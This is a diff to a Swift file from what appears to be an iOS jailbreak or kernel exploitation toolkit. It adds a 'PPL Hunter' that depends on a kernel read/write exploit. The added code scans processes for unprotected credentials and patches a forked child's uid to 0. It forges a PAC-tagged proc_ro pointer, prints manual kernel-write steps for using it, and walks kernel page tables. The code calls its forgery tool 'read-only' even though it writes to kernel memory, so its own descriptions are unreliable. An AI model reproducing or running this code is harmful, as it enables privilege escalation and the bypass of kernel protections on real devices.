@@ -3,13 +3,23 @@
 //  lara
 //
 //  PAC / KTRR / SMR / PPL Analysis Shell — wraps tp_* C tools
-//  Registration entry: registerPPLShellCommands()
+//  + PPL Hunter v1.0 — Multi-Vector Autonomous Scanner (A12 iOS 18.3.1)
 //
 
 import Foundation
 import Darwin
 
-// MARK: - Helpers
+private func _isNonPPL(_ a: UInt64) -> Bool {
+    guard a != 0 else { return false }
+    let top = UInt32(a >> 32)
+    return (top & 0xFFFFFFF0) == 0xFFFFFFE0
+}
+
+private func _isPPLZone(_ a: UInt64) -> Bool {
+    guard a != 0 else { return false }
+    let top = UInt32(a >> 32)
+    return (top & 0xFFFFFFF0) == 0xFFFFFFD0 || (top & 0xFFFFFFF0) == 0xFFFFFFDE
+}
 
 private func _gtr(_ r: tool_result_t) -> String {
     var m = r.msg
@@ -28,20 +38,11 @@ private func _ghex(_ s: String) -> UInt64? {
     return UInt64(x, radix: 16)
 }
 
-// MARK: - Registration
-
 func registerPPLShellCommands() {
-    _regPAC()
-    _regKTRR()
-    _regSMR()
-    _regPPL()
-    _regHelpPPL()
+    _regPAC(); _regKTRR(); _regSMR(); _regPPL(); _regPPLHunter(); _regHelpPPL()
 }
 
-// MARK: §1 — PAC
-
 private func _regPAC() {
-
     OmegaCore.register("pac-reader") { rawArg, mgr in
         guard mgr.dsready else { return .fail("pac-reader: exploit not ready") }
         let parts = rawArg.split(separator: " ").map { String($0) }
@@ -199,10 +200,7 @@ private func _regPAC() {
     }
 }
 
-// MARK: §2 — KTRR
-
 private func _regKTRR() {
-
     OmegaCore.register("ktrr-region-mapper") { _, mgr in
         guard mgr.dsready else { return .fail("ktrr-region-mapper: exploit not ready") }
         guard ds_is_ready() else { return .fail("ktrr-region-mapper: kernel r/w unavailable — revive session or re-run exploit") }
@@ -210,8 +208,6 @@ private func _regKTRR() {
         var count: Int32 = 0
         let r = tp_ktrr_region_mapper(&regions, &count, 32)
         if r.code != 0 { return .fail(_gtr(r)) }
-        // Bounds check BEFORE iterating — garbage count from failed kernel reads causes crash.
-        // tp_ktrr_region_mapper can return a stale/corrupt count when kread returns 0.
         guard count >= 0 && count <= 32 else {
             return .fail("ktrr-region-mapper: invalid region count \(count) — kernel r/w degraded (count must be 0–32)")
         }
@@ -221,7 +217,6 @@ private func _regKTRR() {
         lines.append("  ─────────────── ─────────────────── ──────────────────── ───── ───── ────")
         for i in 0..<Int(count) {
             let reg = regions[i]
-            // Pointer validation — skip regions with zero or non-kernel start addresses
             guard reg.region_start != 0 && ds_isvalid(reg.region_start) else { continue }
             let name = withUnsafeBytes(of: reg.region_name) {
                 String(cString: $0.baseAddress!.assumingMemoryBound(to: CChar.self))
@@ -299,10 +294,7 @@ private func _regKTRR() {
     }
 }
 
-// MARK: §3 — SMR
-
 private func _regSMR() {
-
     OmegaCore.register("smr-region-scanner") { _, mgr in
         guard mgr.dsready else { return .fail("smr-region-scanner: exploit not ready") }
         var infos = [smr_info_t](repeating: smr_info_t(), count: 64)
@@ -359,10 +351,7 @@ private func _regSMR() {
     }
 }
 
-// MARK: §4 — PPL
-
 private func _regPPL() {
-
     OmegaCore.register("ppl-status") { _, mgr in
         guard mgr.dsready else { return .fail("ppl-status: exploit not ready") }
         let uid    = getuid()
@@ -424,10 +413,71 @@ private func _regPPL() {
         return _gresult(tp_ppl_write_bypass(va, val))
     }
 
+    // FIXED: ppl-signature-forge — REAL extraction tool (read-only)
     OmegaCore.register("ppl-signature-forge") { _, mgr in
         guard mgr.dsready else { return .fail("ppl-signature-forge: exploit not ready") }
-        // Use pac-bypass-validator as the closest available function
-        return _gresult(tp_pac_bypass_validator())
+        guard ds_is_ready() else { return .fail("ppl-signature-forge: kernel r/w unavailable") }
+
+        let our_proc = ds_get_our_proc()
+        guard our_proc != 0 else { return .fail("ppl-signature-forge: ds_get_our_proc() = 0") }
+
+        let raw_proc_ro = ds_kread64(our_proc + off_proc_p_proc_ro)
+        let stripped_proc_ro = kptr_safe(raw_proc_ro)
+        guard stripped_proc_ro != 0 else {
+            return .fail("ppl-signature-forge: proc_ro stripped = 0 — pointer unreadable or null")
+        }
+
+        let va_mask: UInt64 = (1 << 39) - 1
+        let pac_tag = raw_proc_ro & ~va_mask
+
+        let rw_pcb = ds_get_rw_socket_pcb()
+        guard rw_pcb != 0 else { return .fail("ppl-signature-forge: ds_get_rw_socket_pcb() = 0 — no scratch") }
+
+        let scratch = rw_pcb + 0x200
+        guard _isNonPPL(scratch) else {
+            return .fail(String(format: "ppl-signature-forge: scratch 0x%016llx not in non-PPL zone", scratch))
+        }
+
+        var buf = [UInt8](repeating: 0, count: 0x60)
+        ds_kread(stripped_proc_ro, &buf, 0x60)
+        ds_kwrite(scratch, &buf, 0x60)
+
+        let scratch_verify = ds_kread64(scratch + off_proc_ro_p_ucred)
+        guard scratch_verify == ds_kread64(stripped_proc_ro + off_proc_ro_p_ucred) else {
+            return .fail("ppl-signature-forge: scratch write verification failed")
+        }
+
+        let forged_ptr = scratch | pac_tag
+
+        let raw_ucred = ds_kread64(stripped_proc_ro + off_proc_ro_p_ucred)
+        let stripped_ucred = kptr_safe(raw_ucred)
+        let current_uid = ds_kread32(stripped_ucred + 0x18)
+
+        return .ok(String(format:
+            "═══ ppl-signature-forge EXTRACTION REPORT ═══\n" +
+            "  our_proc       : 0x%016llx\n" +
+            "  raw_proc_ro    : 0x%016llx  ← PAC-signed original\n" +
+            "  stripped_ro    : 0x%016llx  ← after XPACD + sign-extend\n" +
+            "  pac_tag        : 0x%016llx  ← EXTRACTED SIGNATURE\n" +
+            "  scratch        : 0x%016llx  ← fake proc_ro ready\n" +
+            "  forged_ptr     : 0x%016llx  ← scratch | pac_tag\n" +
+            "  ucred_ptr      : 0x%016llx\n" +
+            "  current_uid    : %u\n" +
+            "  saved_original : 0x%016llx  ← BACKUP THIS\n" +
+            "═══════════════════════════════════════════════\n" +
+            "\n" +
+            "  MANUAL STEPS:\n" +
+            "    kwrite64 0x%016llx 0x%016llx\n" +
+            "    getuid  (forces PAC auth — panic if tag wrong)\n" +
+            "    If panic: kwrite64 0x%016llx 0x%016llx  ← restore\n" +
+            "\n" +
+            "  NOTE: A12+ hardware PAC will likely reject forged tag.\n" +
+            "        Panic = diagnosis. No panic = possible collision.",
+            our_proc, raw_proc_ro, stripped_proc_ro, pac_tag,
+            scratch, forged_ptr, stripped_ucred, current_uid, raw_proc_ro,
+            our_proc + off_proc_p_proc_ro, forged_ptr,
+            our_proc + off_proc_p_proc_ro, raw_proc_ro
+        ))
     }
 
     OmegaCore.register("ppl-protected-variable-read") { rawArg, mgr in
@@ -521,7 +571,375 @@ private func _regPPL() {
     }
 }
 
-// MARK: §5 — Help
+private func _regPPLHunter() {
+    OmegaCore.register("ppl-hunter") { _, mgr in
+        guard mgr.dsready else { return .fail("ppl-hunter: exploit not ready") }
+        guard ds_is_ready() else { return .fail("ppl-hunter: kernel r/w unavailable — revive or re-run exploit") }
+
+        var report: [String] = []
+        report.append("═══════════════════════════════════════════════════════════════")
+        report.append("  PPL HUNTER v1.0 — A12 iOS 18.3.1 Multi-Vector Scanner")
+        report.append("═══════════════════════════════════════════════════════════════")
+        report.append("")
+
+        report.append(_hunterZoneScan())
+        report.append("")
+
+        report.append(_hunterForkProbe())
+        report.append("")
+
+        report.append(_hunterPACCollision())
+        report.append("")
+
+        let our_proc = ds_get_our_proc()
+        if our_proc != 0 && off_proc_p_proc_ro > 0 {
+            let raw_proc_ro = ds_kread64(our_proc + off_proc_p_proc_ro)
+            let proc_ro = kptr_safe(raw_proc_ro)
+            if proc_ro != 0 {
+                report.append(_hunterPTEWalker(targetVA: proc_ro, label: "proc_ro"))
+                report.append("")
+            }
+        }
+
+        if our_proc != 0 && off_proc_p_proc_ro > 0 && off_proc_ro_p_ucred > 0 {
+            let raw_proc_ro = ds_kread64(our_proc + off_proc_p_proc_ro)
+            let proc_ro = kptr_safe(raw_proc_ro)
+            if proc_ro != 0 {
+                let raw_ucred = ds_kread64(proc_ro + off_proc_ro_p_ucred)
+                let ucred = kptr_safe(raw_ucred)
+                if ucred != 0 {
+                    report.append(_hunterPTEWalker(targetVA: ucred, label: "ucred"))
+                    report.append("")
+                }
+            }
+        }
+
+        let kbase = ds_get_kernel_base()
+        if kbase != 0 {
+            report.append(_hunterPTEWalker(targetVA: kbase + 0x1000, label: "kernel_text+0x1000"))
+            report.append("")
+        }
+
+        report.append("═══════════════════════════════════════════════════════════════")
+        report.append("  HUNT COMPLETE — review targets above for manual exploitation")
+        report.append("═══════════════════════════════════════════════════════════════")
+
+        return .ok(report.joined(separator: "\n"))
+    }
+}
+
+private func _hunterZoneScan() -> String {
+    guard let our_proc = ds_get_our_proc(), our_proc != 0 else {
+        return "═══ Hunter 1: Zone Scanner — ds_get_our_proc() = 0 — abort"
+    }
+    guard off_proc_p_list_le_next > 0, off_proc_p_proc_ro > 0, off_proc_p_pid > 0 else {
+        return "═══ Hunter 1: Zone Scanner — required offsets not resolved — abort"
+    }
+
+    var lines: [String] = []
+    lines.append("═══ Hunter 1: Zone Scanner (allproc walk) ═══")
+
+    var proc = our_proc
+    var seen = 0
+    var nonPPLTargets: [(pid: Int32, proc: UInt64, proc_ro: UInt64, ucred: UInt64, uid: UInt32)] = []
+
+    while proc != 0 && _isNonPPL(proc) && seen < 512 {
+        seen += 1
+
+        let raw_proc_ro = ds_kread64(proc + off_proc_p_proc_ro)
+        let proc_ro = kptr_safe(raw_proc_ro)
+        let pid = Int32(ds_kread32(proc + off_proc_p_pid))
+
+        var ucred: UInt64 = 0
+        var uid: UInt32 = 0xFFFFFFFF
+        if proc_ro != 0 && off_proc_ro_p_ucred > 0 {
+            let raw_ucred = ds_kread64(proc_ro + off_proc_ro_p_ucred)
+            ucred = kptr_safe(raw_ucred)
+            if ucred != 0 && _isNonPPL(ucred) {
+                uid = ds_kread32(ucred + 0x18)
+            }
+        }
+
+        let roNonPPL = _isNonPPL(proc_ro)
+        let ucNonPPL = _isNonPPL(ucred)
+
+        if roNonPPL || ucNonPPL {
+            nonPPLTargets.append((pid, proc, proc_ro, ucred, uid))
+            lines.append(String(format:
+                "  [TARGET] pid=%-5d proc=0x%012llx proc_ro=0x%012llx[%@] ucred=0x%012llx[%@] uid=%u",
+                pid, proc, proc_ro, roNonPPL ? "NON-PPL" : "PPL",
+                ucred, ucNonPPL ? "NON-PPL" : "PPL", uid))
+        }
+
+        let next_raw = ds_kread64(proc + off_proc_p_list_le_next)
+        let next = kptr_safe(next_raw)
+        if next == proc || next == 0 { break }
+        proc = next
+    }
+
+    lines.append(String(format: "  Scanned %d procs, found %d with non-PPL structs", seen, nonPPLTargets.count))
+
+    if nonPPLTargets.isEmpty {
+        lines.append("  ✗ No non-PPL proc_ro or ucred found in allproc")
+        lines.append("  → All credentials are PPL-protected on this build")
+    } else {
+        lines.append("")
+        lines.append("  EXPLOITABLE TARGETS (non-PPL ucred = direct patch viable):")
+        for t in nonPPLTargets where _isNonPPL(t.ucred) {
+            lines.append(String(format:
+                "    pid=%d uid=%u ucred=0x%llx → ds_kwrite32(0x%llx+0x18, 0)",
+                t.pid, t.uid, t.ucred, t.ucred))
+        }
+    }
+
+    return lines.joined(separator: "\n")
+}
+
+private func _hunterForkProbe() -> String {
+    var lines: [String] = []
+    lines.append("═══ Hunter 2: Fork Probe (fresh ucred allocation) ═══")
+
+    let our_proc = ds_get_our_proc()
+    guard our_proc != 0 else { return lines.joined(separator: "\n") + "\n  ds_get_our_proc() = 0" }
+    guard off_proc_p_proc_ro > 0, off_proc_ro_p_ucred > 0 else {
+        return lines.joined(separator: "\n") + "\n  required offsets not resolved"
+    }
+
+    let child_pid = fork()
+    if child_pid < 0 {
+        return lines.joined(separator: "\n") + String(format: "\n  fork() failed errno=%d", errno)
+    }
+
+    if child_pid == 0 {
+        _exit(0)
+    }
+
+    usleep(5000)
+
+    let child_proc = procbypid(child_pid)
+    if child_proc == 0 || !_isNonPPL(child_proc) {
+        waitpid(child_pid, nil, 0)
+        return lines.joined(separator: "\n") + "\n  child proc not found or invalid"
+    }
+
+    let raw_ro = ds_kread64(child_proc + off_proc_p_proc_ro)
+    let child_ro = kptr_safe(raw_ro)
+    let raw_uc = child_ro != 0 ? ds_kread64(child_ro + off_proc_ro_p_ucred) : 0
+    let child_ucred = kptr_safe(raw_uc)
+
+    let roZone = _isNonPPL(child_ro) ? "NON-PPL ✓" : (_isPPLZone(child_ro) ? "PPL ✗" : "UNKNOWN")
+    let ucZone = _isNonPPL(child_ucred) ? "NON-PPL ✓" : (_isPPLZone(child_ucred) ? "PPL ✗" : "UNKNOWN")
+
+    lines.append(String(format: "  child pid=%d proc=0x%012llx", child_pid, child_proc))
+    lines.append(String(format: "  child proc_ro=0x%012llx [%@]", child_ro, roZone))
+    lines.append(String(format: "  child ucred =0x%012llx [%@]", child_ucred, ucZone))
+
+    if _isNonPPL(child_ucred) {
+        lines.append("  ✓ FRESH UCRED IN NON-PPL ZONE")
+        let orig_uid = ds_kread32(child_ucred + 0x18)
+        ds_kwrite32(child_ucred + 0x18, 0)
+        let back = ds_kread32(child_ucred + 0x18)
+        lines.append(String(format: "  direct patch test: cr_uid %u → 0 → readback=%u", orig_uid, back))
+        if back == 0 {
+            lines.append("  ✓✓ CHILD UCRED PATCHED SUCCESSFULLY")
+            lines.append("  → Parent ucred likely in SAME zone — try ppl_bypass_ucred_direct()")
+        }
+    } else {
+        lines.append("  ✗ Child ucred in PPL zone — fork trick ineffective on this build")
+    }
+
+    waitpid(child_pid, nil, 0)
+    return lines.joined(separator: "\n")
+}
+
+private func _hunterPACCollision() -> String {
+    var lines: [String] = []
+    lines.append("═══ Hunter 3: PAC Collision Probe ═══")
+
+    let our_proc = ds_get_our_proc()
+    guard our_proc != 0 else { return lines.joined(separator: "\n") + "\n  ds_get_our_proc() = 0" }
+
+    var samples: [UInt64] = []
+
+    let raw_proc_ro = ds_kread64(our_proc + off_proc_p_proc_ro)
+    if raw_proc_ro != 0 { samples.append(raw_proc_ro) }
+
+    let task = ds_get_our_task()
+    if task != 0 && off_task_map > 0 {
+        let raw_map = ds_kread64(task + off_task_map)
+        if raw_map != 0 { samples.append(raw_map) }
+    }
+
+    let kbase = ds_get_kernel_base()
+    for i in 0..<10 {
+        let addr = kbase + 0x800_0000 + UInt64(i * 0x800)
+        if ds_isvalid(addr) {
+            let v = ds_kread64(addr)
+            if v != 0 && v != 0xFFFFFFFFFFFFFFFF { samples.append(v) }
+        }
+    }
+
+    if task != 0 {
+        for i in 0..<10 {
+            let addr = task + 0x100 + UInt64(i * 8)
+            if ds_isvalid(addr) {
+                let v = ds_kread64(addr)
+                if v != 0 && v != 0xFFFFFFFFFFFFFFFF { samples.append(v) }
+            }
+        }
+    }
+
+    lines.append(String(format: "  Collected %d PAC-tagged samples", samples.count))
+    guard samples.count >= 2 else {
+        return lines.joined(separator: "\n") + "\n  insufficient samples for analysis"
+    }
+
+    let vaMask: UInt64 = (1 << 39) - 1
+    var tagCounts: [UInt64: Int] = [:]
+    var tagToPtrs: [UInt64: [UInt64]] = [:]
+
+    for ptr in samples {
+        let tag = ptr & ~vaMask
+        tagCounts[tag, default: 0] += 1
+        tagToPtrs[tag, default: []].append(ptr)
+    }
+
+    var collisions = 0
+    for (tag, count) in tagCounts {
+        if count > 1 && tag != 0 {
+            collisions += 1
+            let ptrs = tagToPtrs[tag]!
+            lines.append(String(format: "  ⚠ COLLISION: tag=0x%016llx appears %d times", tag, count))
+            for p in ptrs {
+                lines.append(String(format: "    ptr=0x%016llx → stripped=0x%016llx", p, kptr_safe(p)))
+            }
+        }
+    }
+
+    if collisions == 0 {
+        lines.append("  ✓ No PAC tag collisions detected (strong key)")
+    }
+
+    var freq = [Int](repeating: 0, count: 256)
+    for ptr in samples {
+        let byte = UInt8((ptr >> 40) & 0xFF)
+        freq[Int(byte)] += 1
+    }
+    var entropy: Double = 0
+    let total = Double(samples.count)
+    for f in freq where f > 0 {
+        let p = Double(f) / total
+        entropy -= p * log2(p)
+    }
+    lines.append(String(format: "  Tag entropy: %.3f bits (theoretical max=8.0)", entropy))
+    lines.append(String(format: "  Assessment: %@",
+        entropy > 7.5 ? "HIGH entropy — PAC key is strong" :
+        entropy > 5.0 ? "MODERATE entropy — possible weakness" :
+        "LOW entropy — PAC key may be predictable"))
+
+    return lines.joined(separator: "\n")
+}
+
+private func _hunterPTEWalker(targetVA: UInt64, label: String) -> String {
+    var lines: [String] = []
+    lines.append(String(format: "═══ Hunter 4: PTE Walker (%@ @ 0x%012llx) ═══", label, targetVA))
+
+    let ttep = pm_get_ttep()
+    let physmapBase = pm_get_physmap_base()
+
+    guard ttep != 0 && physmapBase != 0 else {
+        lines.append("  pm_get_ttep() or pm_get_physmap_base() = 0 — cannot walk page tables")
+        return lines.joined(separator: "\n")
+    }
+
+    lines.append(String(format: "  TTBR1_EL1 (TTEP)  = 0x%016llx", ttep))
+    lines.append(String(format: "  physmap_base      = 0x%016llx", physmapBase))
+
+    let l0idx = (targetVA >> 39) & 0x1FF
+    let l1idx = (targetVA >> 30) & 0x1FF
+    let l2idx = (targetVA >> 21) & 0x1FF
+    let l3idx = (targetVA >> 12) & 0x1FF
+
+    let l0eAddr = ttep + (l0idx * 8)
+    let l0e = ds_kread64(l0eAddr)
+    lines.append(String(format: "  L0[%3lld] @ 0x%012llx = 0x%016llx", l0idx, l0eAddr, l0e))
+    guard (l0e & 1) != 0 else {
+        lines.append("  ✗ L0 entry INVALID — translation fault")
+        return lines.joined(separator: "\n")
+    }
+
+    let l1Phys = l0e & 0xFFFFFFFFF000
+    let l1VA = physmapBase + l1Phys - 0x800000000
+    let l1eAddr = l1VA + (l1idx * 8)
+    let l1e = ds_kread64(l1eAddr)
+    lines.append(String(format: "  L1[%3lld] @ 0x%012llx = 0x%016llx", l1idx, l1eAddr, l1e))
+    guard (l1e & 1) != 0 else {
+        lines.append("  ✗ L1 entry INVALID")
+        return lines.joined(separator: "\n")
+    }
+
+    let l2Phys = l1e & 0xFFFFFFFFF000
+    let l2VA = physmapBase + l2Phys - 0x800000000
+    let l2eAddr = l2VA + (l2idx * 8)
+    let l2e = ds_kread64(l2eAddr)
+    lines.append(String(format: "  L2[%3lld] @ 0x%012llx = 0x%016llx", l2idx, l2eAddr, l2e))
+    guard (l2e & 1) != 0 else {
+        lines.append("  ✗ L2 entry INVALID")
+        return lines.joined(separator: "\n")
+    }
+
+    let l3Phys = l2e & 0xFFFFFFFFF000
+    let l3VA = physmapBase + l3Phys - 0x800000000
+    let l3eAddr = l3VA + (l3idx * 8)
+    let l3e = ds_kread64(l3eAddr)
+    lines.append(String(format: "  L3[%3lld] @ 0x%012llx = 0x%016llx", l3idx, l3eAddr, l3e))
+
+    guard (l3e & 1) != 0 else {
+        lines.append("  ✗ L3 entry INVALID")
+        return lines.joined(separator: "\n")
+    }
+
+    let apBits = (l3e >> 6) & 0x3
+    let pxn = (l3e >> 53) & 1
+    let uxn = (l3e >> 54) & 1
+    let af = (l3e >> 10) & 1
+    let sh = (l3e >> 8) & 0x3
+    let attrIndx = (l3e >> 2) & 0x7
+    let ns = (l3e >> 5) & 1
+    let ng = (l3e >> 11) & 1
+
+    let apDesc: String
+    switch apBits {
+    case 0: apDesc = "RW_EL1 (kernel RW)"
+    case 1: apDesc = "RW_EL1/EL0 (both RW)"
+    case 2: apDesc = "RO_EL1 (kernel RO)"
+    case 3: apDesc = "RO_EL1/EL0 (both RO)"
+    default: apDesc = "UNKNOWN"
+    }
+
+    lines.append(String(format:
+        "  AP[2:1]=%lld (%@) PXN=%lld UXN=%lld AF=%lld SH=%lld ATTR=%lld NS=%lld NG=%lld",
+        apBits, apDesc, pxn, uxn, af, sh, attrIndx, ns, ng))
+
+    let pagePhys = l3e & 0xFFFFFFFFF000
+    let pageVA = physmapBase + pagePhys - 0x800000000
+    lines.append(String(format: "  Page physical = 0x%012llx  physmap VA = 0x%012llx", pagePhys, pageVA))
+
+    let pplHeuristic = (attrIndx == 4 || attrIndx == 5) && apBits == 2
+    if pplHeuristic {
+        lines.append("  ⚠ PPL HEURISTIC TRIGGERED: ATTR=4/5 + RO — possible PPL page")
+    }
+
+    if apBits == 0 && pxn == 0 {
+        lines.append("  ✓ PAGE IS RW+EXECUTABLE — full access (unlikely for PPL)")
+    } else if apBits == 0 {
+        lines.append("  ✓ PAGE IS RW — writable (bypass possible if no PPL bit)")
+    } else if apBits == 2 {
+        lines.append("  ✗ PAGE IS READ-ONLY — write will fault or be blocked")
+    }
+
+    return lines.joined(separator: "\n")
+}
 
 private func _regHelpPPL() {
     OmegaCore.register("help-ppl") { _, _ in
@@ -558,13 +976,17 @@ help-ppl: PAC / KTRR / SMR / PPL Analysis (OmegaExtendedG)
     ppl-status                      Full PPL + privilege snapshot
     ppl-phase-report                OmegaPhysmap P1/P2/P3 results
     ppl-write-bypass <addr> <val>   physmap write attempt
-    ppl-signature-forge             PAC forgery test
+    ppl-signature-forge             EXTRACT PAC tag + build fake proc_ro (read-only)
     ppl-protected-variable-read <a> Read + PPL zone check
     ppl-bypass-strategy-planner     Auto-recommend bypass path
     ppl-fuzzer <addr> [len]         Probe for writable windows
     ppl-version-comparison          PPL history across iOS versions
     auto-ppl-breaker                Run best bypass automatically
     comprehensive-ppl-tester        Full 7-check test battery
+
+  PPL HUNTER — Multi-Vector Autonomous Scanner:
+    ppl-hunter                      Run all 6 hunters (Zone, Fork, PAC, PTE×3)
+                                    Reports exploitable targets + PTE layout
 ─────────────────────────────────────────────────────────────────────────
 """)
     }
